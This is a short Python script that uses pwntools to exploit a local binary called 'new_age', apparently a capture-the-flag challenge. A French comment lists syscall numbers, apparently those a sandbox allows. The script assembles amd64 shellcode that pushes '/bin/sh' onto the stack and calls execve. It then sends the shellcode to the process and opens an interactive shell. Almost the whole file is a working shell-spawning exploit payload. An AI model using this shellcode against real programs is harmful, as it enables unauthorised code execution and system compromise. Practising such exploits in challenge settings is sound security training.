''' 
autorisé :
0X2 -> open
0X101 -> openat
0X3B -> execve
0X142 -> execveat
0X39 -> fork
0X3a -> vfork
0X38 -> clone
0X1B3 ??
0X28 -> sendfile
0XA1 -> chroot
0X29 -> socket
0X2A -> connect
'''

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

shellcode = asm("""
    mov     rbx, 0x68732F6E69622F
    push    rbx
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    mov     rax, 0X3B
    syscall
""")



io = process("./new_age")
print(shellcode)
io.sendline(shellcode)
io.interactive()